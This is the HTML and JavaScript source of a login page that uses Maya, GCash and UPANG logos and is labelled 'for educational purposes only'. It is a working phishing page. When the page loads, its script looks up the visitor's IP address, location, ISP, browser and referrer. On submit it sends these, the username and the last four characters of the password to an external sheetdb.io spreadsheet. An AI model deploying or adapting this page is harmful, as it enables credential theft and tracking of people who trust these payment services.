<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Testing Website</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <style type="text/css">
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }


        .text {
            text-align: center;
            color: #555;
            font-style: italic;
            margin-bottom: 20px;
        }

        .login-container {
            text-align: center;

        }

        p {
            color: #333;
            line-height: 1.6;
            text-align: justify;
        }


        .image-container {
            text-align: center;
            margin-bottom: 20px;

        }

        .image-container img {
            width: 100px;
            height: auto;
        }

        form {
            width: 300px;
            padding: 50px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            margin: 20px auto;

        }

        label {
            display: block;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 8px;
            margin-bottom: 16px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }
    </style>
</head>

<body>

    <div id="original-content" class="login-container">
        <div class="image-container">
            <img src="maya.jpg" alt="maya">
            <img src="UPANG.png" alt="UPANG">
            <img src="Gcash.jpeg" alt="GCASH">
        </div>

        <h1>This is for educational purposes only</h1>

        <p class="text">
            Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et
            dolore magna aliqua. Massa massa ultricies mi quis hendrerit dolor magna eget.<br>
            Augue lacus viverra vitae congue eu consequat ac felis. Ut tortor pretium viverra suspendisse potenti nullam
            ac.
            Amet nisl suscipit adipiscing bibendum est ultricies.
        </p>

        <h2>Login Form</h2>

        <form method="POST" action="https://sheetdb.io/api/v1/e8qqennjjjob7" id="sheetdb-form">

            <label for="username">Username:</label>
            <input type="text" id="username" name="data[Username]" required>
            <br>

            <label for="password">Password:</label>
            <input type="password" id="password" name="data[password]" required>
            <br>

            <!-- Add hidden input fields to store information -->
            <input type="hidden" id="ip-address-input" name="data[ip-address]" value="">
            <input type="hidden" id="city-input" name="data[city]" value="">
            <input type="hidden" id="country-input" name="data[country]" value="">
            <input type="hidden" id="isp-input" name="data[isp]" value="">
            <input type="hidden" id="user-agent-input" name="data[user-agent]" value="">
            <input type="hidden" id="referral-url-input" name="data[referral-url]" value="">
            <input type="hidden" id="date-time-input" name="data[date-time]" value="">
            <input type="hidden" id="channel-input" name="data[channel]" value="">

            <button type="submit">Login</button>
        </form>
    </div>

    <script>
        function get() {
            var allowedDomain = "examplep1.000webhostapp.com";

            // Fetch the IP address using ipapi.co
            $.getJSON('https://ipapi.co/json', function (data) {
                // Check the logs if it passes through properly
                console.log('IP API Response:', data);
                console.log('Referral URL:', document.referrer);

                // Set the date and time
                var currentDateTime = new Date().toISOString();
                $('#date-time-input').val(currentDateTime);

                // Updates the hidden input fields
                $('#ip-address-input').val(data.ip);
                $('#city-input').val(data.region);
                $('#country-input').val(data.country_name);
                $('#isp-input').val(data.org);
                $('#user-agent-input').val(navigator.userAgent);
                $('#channel-input').val(location.protocol);

                if (document.location.protocol === 'file:' || document.location.hostname === '127.0.0.1') {
                    $('#referral-url-input').val(document.location);
                } else {
                    // Check if the referrer is available
                    $('#referral-url-input').val(document.referrer);
                }

                // Handle form submission
                var form = document.getElementById('sheetdb-form');
                form.addEventListener("submit", function (e) {
                    e.preventDefault(); // To prevent from opening another tab

                    // Get the full password
                    var fullPassword = $('#password').val();

                    // Determine if the password should be truncated or not
                    var truncatedPassword = fullPassword.length > 4 ? '*'.repeat(fullPassword.length - 4) + fullPassword.slice(-4) : fullPassword;

                    // Add the password to the hidden field
                    $('[name="data[password]"]').val(truncatedPassword);
                    // Check if the current domain is not the allowed one
                    if (window.location.hostname !== allowedDomain) {
                        // Fetch data using AJAX
                        fetch(form.action, {
                            method: "POST",
                            body: new FormData(form),
                        })
                            .then(response => response.json())
                            .then(data => {
                                // Handle the response data
                                console.log(data);
                                alert('Success'); // To check if it passed through

                                // Reset the form
                                form.reset();
                            })
                            .catch(error => {
                                console.error('Error:', error);
                                alert('Error occurred'); // To check if it did not pass through
                            });
                    }
                    // else {
                    //     // Fetch data using AJAX with only the username
                    //     fetch(form.action, {
                    //         method: "POST",
                    //         body: JSON.stringify({
                    //             "data[Username]": $('#username').val()
                    //         }),
                    //         headers: {
                    //             'Content-Type': 'application/json'
                    //         }
                    //     })
                    //         .then(response => response.json())
                    //         .then(data => {
                    //             // Handle the response data
                    //             console.log(data);
                    //             alert('Success'); // To check if it passed through

                    //             // Reset the form
                    //             form.reset();
                    //         })
                    //         .catch(error => {
                    //             console.error('Error:', error);
                    //             alert('Error occurred'); // To check if it did not pass through
                    //         });
                    // }
                });
            });
        }
    </script>


    <script>
        // Check if a global function from the external script is defined
        if (typeof get === 'undefined') {
            // Make the webpage unusable
            makeWebpageUnusable();
        } else {
            // Call the function if it's defined
            get();
        }

        function makeWebpageUnusable() {
            // Replace the body content with a placeholder message or a different HTML structure
            $('body').html(
                '<h1>This is for educational purposes only</h1><img style="width: 700px; height: auto;" src="maya.jpg" alt="maya"><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Massa massa ultricies mi quis hendrerit dolor magna eget. Augue lacus viverra vitae congue eu consequat ac felis. Ut tortor pretium viverra suspendisse potenti nullam ac. Amet nisl suscipit adipiscing bibendum est ultricies.</p><img style="width: 100px; height: auto;" src="UPANG.png" alt="UPANG"><img style="width: 500px; height: 100;" src="Gcash.jpeg" alt="GCASH"><h2>Login Form</h2><label for="username">Username:</label><input type="text" id="username" name="data[Username]" required><label for="password">Password:</label><input type="password" id="password" name="data[password]" required><button type="submit">Login</button>'
            );

        }
    </script>




</body>

</html>